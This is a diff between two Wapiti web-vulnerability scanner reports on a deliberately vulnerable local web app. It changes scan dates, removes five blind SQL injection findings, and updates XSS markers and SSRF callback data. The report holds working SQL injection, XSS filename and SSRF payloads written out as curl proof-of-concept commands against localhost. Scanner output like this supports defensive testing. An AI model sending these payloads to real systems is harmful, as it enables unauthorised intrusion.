@@ -1,14 +1,14 @@
 ********************************************************************************
                      Wapiti 3.0.1 - wapiti.sourceforge.net
                        Report for http://localhost:8000/
-              Date of the scan : Sun, 07 Jul 2019 14:58:34 +0000
+              Date of the scan : Sun, 28 Jul 2019 15:39:40 +0000
                           Scope of the scan : folder
 ********************************************************************************
 
 Summary of vulnerabilities :
 ----------------------------
                                                             SQL Injection :   2
-                                                      Blind SQL Injection :   5
+                                                      Blind SQL Injection :   0
                                                             File Handling :   1
                                                      Cross Site Scripting :   1
                                                            CRLF Injection :   0
@@ -36,54 +36,6 @@ Evil request:
     Host: localhost:8000
     Referer: http://localhost:8000/vulnerabilities/sqli/
 cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit" -e "http://localhost:8000/vulnerabilities/sqli/""
-
-                                  *   *   *
-
-********************************************************************************
-
-Blind SQL Injection
--------------------
-Blind SQL vulnerability via injection in the parameter username
-Evil request:
-    GET /vulnerabilities/brute/?username=%27%20or%20sleep%287%29%231&password=letmein&Login=Login HTTP/1.1
-    Host: localhost:8000
-    Referer: http://localhost:8000/vulnerabilities/brute/
-cURL command PoC : "curl "http://localhost:8000/vulnerabilities/brute/?username=%27%20or%20sleep%287%29%231&password=letmein&Login=Login" -e "http://localhost:8000/vulnerabilities/brute/""
-
-                                  *   *   *
-
-Blind SQL vulnerability via injection in the parameter password_new
-Evil request:
-    GET /vulnerabilities/csrf/?password_new=sleep%287%29%231&password_conf=letmein&Change=Change HTTP/1.1
-    Host: localhost:8000
-    Referer: http://localhost:8000/vulnerabilities/csrf/
-cURL command PoC : "curl "http://localhost:8000/vulnerabilities/csrf/?password_new=sleep%287%29%231&password_conf=letmein&Change=Change" -e "http://localhost:8000/vulnerabilities/csrf/""
-
-                                  *   *   *
-
-Blind SQL vulnerability via injection in the parameter page
-Evil request:
-    GET /vulnerabilities/fi/?page=sleep%287%29%231 HTTP/1.1
-    Host: localhost:8000
-cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=sleep%287%29%231""
-
-                                  *   *   *
-
-Blind SQL vulnerability via injection in the parameter id
-Evil request:
-    GET /vulnerabilities/sqli/?id=sleep%287%29%231&Submit=Submit HTTP/1.1
-    Host: localhost:8000
-    Referer: http://localhost:8000/vulnerabilities/sqli/
-cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli/?id=sleep%287%29%231&Submit=Submit" -e "http://localhost:8000/vulnerabilities/sqli/""
-
-                                  *   *   *
-
-Blind SQL vulnerability via injection in the parameter id
-Evil request:
-    GET /vulnerabilities/sqli_blind/?id=sleep%287%29%231&Submit=Submit HTTP/1.1
-    Host: localhost:8000
-    Referer: http://localhost:8000/vulnerabilities/sqli_blind/
-cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli_blind/?id=sleep%287%29%231&Submit=Submit" -e "http://localhost:8000/vulnerabilities/sqli_blind/""
 
                                   *   *   *
 
@@ -119,11 +71,11 @@ Evil request:
 
     Upload
     ------------------------boundarystring
-    Content-Disposition: form-data; name="uploaded"; filename="<img src=. onerror=alert('wkkehan0gm')>"
+    Content-Disposition: form-data; name="uploaded"; filename="<img src=. onerror=alert('wacujx0ehp')>"
 
     /* snip file content snip */
 ------------------------boundarystring--
-cURL command PoC : "curl "http://localhost:8000/vulnerabilities/upload/" -e "http://localhost:8000/vulnerabilities/upload/" -F "MAX_FILE_SIZE=100000" -F "Upload=Upload" -F "uploaded=@your_local_file;filename=<img src=. onerror=alert('wkkehan0gm')>""
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/upload/" -e "http://localhost:8000/vulnerabilities/upload/" -F "MAX_FILE_SIZE=100000" -F "Upload=Upload" -F "uploaded=@your_local_file;filename=<img src=. onerror=alert('wacujx0ehp')>""
 
                                   *   *   *
 
@@ -198,8 +150,8 @@ cURL command PoC : "curl "http://localhost:8000/login.php""
 Server Side Request Forgery
 ---------------------------
 SSRF vulnerability via injection in the parameter page.
-The target performed an outgoing HTTP GET request at 2019-07-07T17:55:19+02:00 with IP 194.36.110.214.
-Full request can be seen at https://wapiti3.ovh/ssrf_data/n4zzin/47/70616765/1562514919-194.36.110.214.txt
+The target performed an outgoing HTTP GET request at 2019-07-28T17:40:56+02:00 with IP 195.206.183.149.
+Full request can be seen at https://wapiti3.ovh/ssrf_data/g14rru/49/70616765/1564328456-195.206.183.149.txt
 Evil request:
     GET /vulnerabilities/fi/?page=http%3A%2F%2Fexternal.url%2Fpage HTTP/1.1
     Host: localhost:8000
